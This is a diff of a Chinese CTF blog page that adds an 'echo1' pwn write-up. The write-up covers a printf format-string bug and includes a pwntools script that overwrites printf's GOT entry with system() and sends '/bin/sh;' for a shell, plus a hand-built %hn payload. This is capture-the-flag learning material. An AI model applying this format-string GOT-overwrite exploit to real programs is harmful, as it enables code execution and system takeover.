@@ -120,6 +120,8 @@
 				    
 				    <li><a href="/categories/STACK-sandbox/" class="animsition-link">STACK - sandbox<small>(1)</small></a></li>
 				    
+				    <li><a href="/categories/mess/" class="animsition-link">mess<small>(2)</small></a></li>
+				    
 				    <li><a href="/categories/深夜高速/" class="animsition-link">深夜高速<small>(3)</small></a></li>
 				    
 				</ul>
@@ -224,7 +226,7 @@
         </div>
         <div class="col-md-8 col-md-offset-2">
       		
-    <div id="aplayer-JtOmytYV" class="aplayer aplayer-tag-marker meting-tag-marker"
+    <div id="aplayer-fqOFVCvm" class="aplayer aplayer-tag-marker meting-tag-marker"
          data-id="7342554262" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"
     ></div> 
 
@@ -420,14 +422,26 @@
 
 
 
-<h3 id="echo2"><a href="#echo2" class="headerlink" title="echo2"></a>echo2</h3><h4 id="overview"><a href="#overview" class="headerlink" title="overview"></a>overview</h4><p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-22%20%E4%B8%8B%E5%8D%884.27.16.png" alt="截屏2022-03-22 下午4.27.16"></p>
-<h4 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h4><p>​        没啥好逆的，输入字符，然后输出字符，纯纯格式化字符串。</p>
+<h3 id="echo1"><a href="#echo1" class="headerlink" title="echo1"></a>echo1</h3><h4 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h4><p>​        没啥好逆的，输入字符，然后输出字符，纯纯格式化字符串。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  fgets(s, <span class="number">256</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( <span class="built_in">strcmp</span>(s, <span class="string">&quot;exit\n&quot;</span>) );</span><br><span class="line">system(<span class="string">&quot;echo Goodbye&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>
 
 
 
-<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>​        首先通过漏洞泄露地址。这道题涉及对于<code>system()</code>的调用，因此可以利用一下。</p>
+<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>​        由于system的地址已经知道了，就没有必要再泄露，直接利用fmt模块将ptintf got覆盖就行。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./echo&#x27;</span>)</span><br><span class="line"><span class="comment">#r = process(&#x27;node4.buuoj.cn&#x27;,26117)</span></span><br><span class="line">r = process(<span class="string">&quot;./echo&quot;</span>)</span><br><span class="line"></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_got = <span class="number">0x804A010</span></span><br><span class="line"><span class="comment">#system_plt = elf.plt[&#x27;system&#x27;]</span></span><br><span class="line">system_plt = <span class="number">0x8048400</span></span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">7</span>,&#123;printf_got:system_plt&#125;)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendline(<span class="string">&#x27;/bin/sh;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>​        另外其实可以尝试一下手动修改。</p>
+<p>​        其实就是把<code>0x804A010</code>改成<code>0x8048400</code>。</p>
+<p>​        所以payload大概长这样</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = p32(<span class="number">0x804A010</span>)  + <span class="string">b&#x27;%1d10c&#x27;</span>+ <span class="string">b&#x27;%6$hn&#x27;</span>  </span><br></pre></td></tr></table></figure>
+
+
+
 <p>​        </p>
+<p>​        </p>
+<h3 id="echo2"><a href="#echo2" class="headerlink" title="echo2"></a>echo2</h3><p>​        </p>
 <p>​        </p>
 <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>​    通过这篇笔记我确实是认识到自动化脚本的重要性，其实我觉得但凡真正入门了pwn，就不会再浪费时间于一些明明可以自动化完成的东西，就比如说rop有相应的脚本roputil，有onegadget，但是我总是拒绝去用这些东西，反而将大把时间浪费于无谓的调试以及历史脚本的复制粘贴上。</p>
 <p>​    然而简单的题目尚且可以通过手工构造，如果是实战或者盲打，上哪里手工构造呢？我总有一天要面对这个东西，为什么不早点接受呢？</p>
